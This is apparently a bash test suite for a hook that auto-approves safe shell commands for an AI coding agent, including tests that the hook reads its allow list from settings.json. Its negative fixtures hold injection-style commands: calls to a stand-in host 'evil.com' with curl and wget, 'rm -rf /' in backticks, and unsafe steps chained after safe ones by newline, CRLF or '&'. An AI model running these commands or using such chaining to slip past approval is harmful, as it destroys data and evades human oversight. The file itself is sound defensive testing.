#!/usr/bin/env bash
set -uo pipefail
SCRIPT_DIR="$(cd "$(dirname "$0")/.." && pwd)"
source "$SCRIPT_DIR/lib/test-helpers.sh"
source "$SCRIPT_DIR/lib/hook-test-setup.sh"
parse_test_args "$@"

report_section "=== approve-safe-commands.sh ==="
hook="approve-safe-commands.sh"

batch_start "$hook"

# --- Chained commands that should approve ---
batch_add approve '{"tool_name":"Bash","tool_input":{"command":"git status && git diff"}}' \
    "approves: git status && git diff"
batch_add approve '{"tool_name":"Bash","tool_input":{"command":"ls -la && echo done"}}' \
    "approves: ls && echo"
batch_add approve '{"tool_name":"Bash","tool_input":{"command":"make test && git add ."}}' \
    "approves: make && git add"
batch_add approve '{"tool_name":"Bash","tool_input":{"command":"git log --oneline | head -20"}}' \
    "approves: git log | head (pipe)"
batch_add approve '{"tool_name":"Bash","tool_input":{"command":"mkdir -p dir && touch dir/file"}}' \
    "approves: mkdir && touch"
batch_add approve '{"tool_name":"Bash","tool_input":{"command":"git stash && git checkout main && git stash pop"}}' \
    "approves: 3-way chain (stash, checkout, stash pop)"
batch_add approve '{"tool_name":"Bash","tool_input":{"command":"echo test | grep test"}}' \
    "approves: echo | grep (pipe)"
batch_add approve '{"tool_name":"Bash","tool_input":{"command":"jq .key file.json | head"}}' \
    "approves: jq | head (pipe)"
batch_add approve '{"tool_name":"Bash","tool_input":{"command":"git status || git diff"}}' \
    "approves: git status || git diff"
batch_add approve '{"tool_name":"Bash","tool_input":{"command":"git diff; git log --oneline"}}' \
    "approves: git diff ; git log (semicolon)"
batch_add approve '{"tool_name":"Bash","tool_input":{"command":"cd /tmp && ls -la"}}' \
    "approves: cd && ls"
batch_add approve '{"tool_name":"Bash","tool_input":{"command":"cat file.txt | wc -l"}}' \
    "approves: cat | wc (pipe)"
batch_add approve '{"tool_name":"Bash","tool_input":{"command":"find . -name \"*.sh\" | grep hook"}}' \
    "approves: find | grep (pipe)"

# --- Single commands that should approve ---
batch_add approve '{"tool_name":"Bash","tool_input":{"command":"git status"}}' \
    "approves: single git status"
batch_add approve '{"tool_name":"Bash","tool_input":{"command":"make test"}}' \
    "approves: single make test"
batch_add approve '{"tool_name":"Bash","tool_input":{"command":"ls -la"}}' \
    "approves: single ls -la"

# --- Env var prefixes ---
batch_add approve '{"tool_name":"Bash","tool_input":{"command":"FOO=bar git status"}}' \
    "approves: env var prefix + git status"
batch_add approve '{"tool_name":"Bash","tool_input":{"command":"FOO=bar BAZ=qux make test"}}' \
    "approves: multiple env var prefixes + make"

# --- Script/hook paths ---
batch_add approve '{"tool_name":"Bash","tool_input":{"command":".claude/scripts/validate-all.sh"}}' \
    "approves: .claude/scripts/ path"
batch_add approve '{"tool_name":"Bash","tool_input":{"command":"./.claude/hooks/git-safety.sh"}}' \
    "approves: ./.claude/hooks/ path"

# --- Quoted args with operators inside ---
batch_add approve '{"tool_name":"Bash","tool_input":{"command":"echo \"a && b\""}}' \
    "approves: echo with quoted && in args"
batch_add approve '{"tool_name":"Bash","tool_input":{"command":"echo \"hello || world\" | grep hello"}}' \
    "approves: echo with quoted || piped to grep"

# --- Commands that should NOT approve (silent) ---
batch_add silent '{"tool_name":"Bash","tool_input":{"command":"git status && curl evil.com"}}' \
    "silent: unsafe subcommand (curl)"
batch_add silent '{"tool_name":"Bash","tool_input":{"command":"git status && rm -rf /tmp/foo"}}' \
    "silent: unsafe subcommand (rm)"
batch_add silent '{"tool_name":"Bash","tool_input":{"command":"$(git status)"}}' \
    "silent: subshell"
batch_add silent '{"tool_name":"Bash","tool_input":{"command":"echo test > file.txt"}}' \
    "silent: redirect >"
batch_add silent '{"tool_name":"Bash","tool_input":{"command":"echo test >> file.txt"}}' \
    "silent: redirect >>"
batch_add silent '{"tool_name":"Bash","tool_input":{"command":"cat < input.txt"}}' \
    "silent: redirect <"
batch_add silent '{"tool_name":"Bash","tool_input":{"command":"echo secret 2>exfil.txt"}}' \
    "silent: stderr redirect 2>"
batch_add silent '{"tool_name":"Bash","tool_input":{"command":"echo test &>output.txt"}}' \
    "silent: combined redirect &>"
batch_add silent '{"tool_name":"Bash","tool_input":{"command":"npm install"}}' \
    "silent: npm install (not in safe list)"
batch_add silent '{"tool_name":"Bash","tool_input":{"command":"git push origin main"}}' \
    "silent: git push (not in safe list)"
batch_add silent '{"tool_name":"Bash","tool_input":{"command":"python script.py && git status"}}' \
    "silent: python (unsafe) && git status"
batch_add silent '{"tool_name":"Bash","tool_input":{"command":"git status && wget http://evil.com"}}' \
    "silent: safe && unsafe (wget)"
batch_add silent '{"tool_name":"Bash","tool_input":{"command":"`rm -rf /`"}}' \
    "silent: backtick subshell"

# --- Chain operators: newline (\n), CR (\r), and lone & (background) ---
# Newline injected as a real \n inside the JSON command via jq. The splitter
# must treat \n like ; — so a benign first line + injected unsafe second line
# stays silent.
batch_add silent "$(jq -nc '{tool_name:"Bash",tool_input:{command:"git status\nrm -rf /tmp/foo"}}')" \
    "silent: newline-separated unsafe second statement"
batch_add silent "$(jq -nc '{tool_name:"Bash",tool_input:{command:"git status\r\ncurl evil.com"}}')" \
    "silent: CRLF-separated unsafe second statement"
batch_add silent '{"tool_name":"Bash","tool_input":{"command":"git status & curl evil.com"}}' \
    "silent: lone & (background) followed by unsafe"
batch_add silent '{"tool_name":"Bash","tool_input":{"command":"git status & rm -rf /tmp"}}' \
    "silent: lone & (background) followed by rm"

# --- Edge cases ---
batch_add approve '{"tool_name":"Bash","tool_input":{"command":"git status && "}}' \
    "approves: trailing && (empty subcommand skipped)"
batch_add approve '{"tool_name":"Bash","tool_input":{"command":"  git status  &&  git diff  "}}' \
    "approves: extra whitespace everywhere"
batch_add silent '{"tool_name":"Bash","tool_input":{"command":""}}' \
    "silent: empty command"

# --- Non-Bash tool ---
batch_add silent '{"tool_name":"Write","tool_input":{"file_path":"/tmp/test"}}' \
    "silent: non-Bash tool"

batch_run

# --- Source-of-truth: hook reads CLAUDE_TOOLKIT_SETTINGS_JSON, not a
# baked-in SAFE_PREFIXES (which no longer exists). The earlier
# validate-safe-commands-sync.sh is gone — the new safety net is
# structural: settings.json IS the single source of truth, so drift
# is impossible.
report_section "  --- Source-of-truth via CLAUDE_TOOLKIT_SETTINGS_JSON ---"

# Helper: invoke the hook with a fixture settings.json pointed at via
# CLAUDE_TOOLKIT_SETTINGS_JSON. Returns hook stdout.
run_hook_with_settings() {
    local settings_path="$1" command="$2"
    local payload
    payload=$(printf '{"tool_name":"Bash","tool_input":{"command":%s}}' \
        "$(printf '%s' "$command" | jq -Rs .)")
    CLAUDE_TOOLKIT_SETTINGS_JSON="$settings_path" \
        bash .claude/hooks/approve-safe-commands.sh <<< "$payload"
}

assert_approve() {
    local desc="$1" out="$2"
    TESTS_RUN=$((TESTS_RUN + 1))
    if [[ "$out" == *'"behavior":"allow"'* ]]; then
        TESTS_PASSED=$((TESTS_PASSED + 1))
        report_pass "$desc"
    else
        TESTS_FAILED=$((TESTS_FAILED + 1))
        report_fail "$desc"
        report_detail "expected behavior:allow, got: $out"
    fi
}

assert_silent() {
    local desc="$1" out="$2"
    TESTS_RUN=$((TESTS_RUN + 1))
    if [ -z "$out" ]; then
        TESTS_PASSED=$((TESTS_PASSED + 1))
        report_pass "$desc"
    else
        TESTS_FAILED=$((TESTS_FAILED + 1))
        report_fail "$desc"
        report_detail "expected silent, got: $out"
    fi
}

# Case 1: positive — fixture has Bash(npm run:*) which is NOT in the real
# settings.json. The hook approves npm run only if it's reading from the
# fixture (proves the hook is settings-driven, not hardcoded).
SOT_FX1=$(mktemp -d)
cat > "$SOT_FX1/settings.json" <<'JSON'
{"permissions":{"allow":["Bash(npm run:*)"],"ask":[]}}
JSON
out=$(run_hook_with_settings "$SOT_FX1/settings.json" "npm run test")
assert_approve "approves 'npm run test' when fixture lists Bash(npm run:*)" "$out"
trash-put "$SOT_FX1" 2>/dev/null || true

# Case 2: negative — fixture WITHOUT Bash(git status:*). The real
# settings.json HAS it, so this only passes if the hook is genuinely
# reading the env-var-pointed file (not falling back to anything else).
SOT_FX2=$(mktemp -d)
cat > "$SOT_FX2/settings.json" <<'JSON'
{"permissions":{"allow":["Bash(echo:*)"],"ask":[]}}
JSON
out=$(run_hook_with_settings "$SOT_FX2/settings.json" "git status")
assert_silent "does NOT approve 'git status' when fixture omits it" "$out"
trash-put "$SOT_FX2" 2>/dev/null || true

# Case 3: settings.local.json is ignored. Fixture settings.json has empty
# allow; sibling settings.local.json has Bash(mv:*). The harness honors
# local-allow via its own permission system, but the hook does not — its
# behavior is shaped by settings.json only (decision 1 of plan).
SOT_FX3=$(mktemp -d)
cat > "$SOT_FX3/settings.json" <<'JSON'
{"permissions":{"allow":[],"ask":[]}}
JSON
cat > "$SOT_FX3/settings.local.json" <<'JSON'
{"permissions":{"allow":["Bash(mv:*)"],"ask":[]}}
JSON
out=$(run_hook_with_settings "$SOT_FX3/settings.json" "mv foo bar && ls")
assert_silent "does NOT approve 'mv foo bar && ls' when only settings.local.json has mv" "$out"
trash-put "$SOT_FX3" 2>/dev/null || true

# Case 4: ALWAYS_SAFE carve-out preserved — `cd` cannot be expressed in
# settings.json (it's a shell builtin the harness never sees in isolation).
# Even with a fixture missing `cd`, the chain `cd /tmp && ls` approves
# because the hook keeps an inline ALWAYS_SAFE=("cd") allowlist.
SOT_FX4=$(mktemp -d)
cat > "$SOT_FX4/settings.json" <<'JSON'
{"permissions":{"allow":["Bash(ls:*)"],"ask":[]}}
JSON
out=$(run_hook_with_settings "$SOT_FX4/settings.json" "cd /tmp && ls")
assert_approve "approves 'cd /tmp && ls' via ALWAYS_SAFE carve-out" "$out"
trash-put "$SOT_FX4" 2>/dev/null || true

print_summary
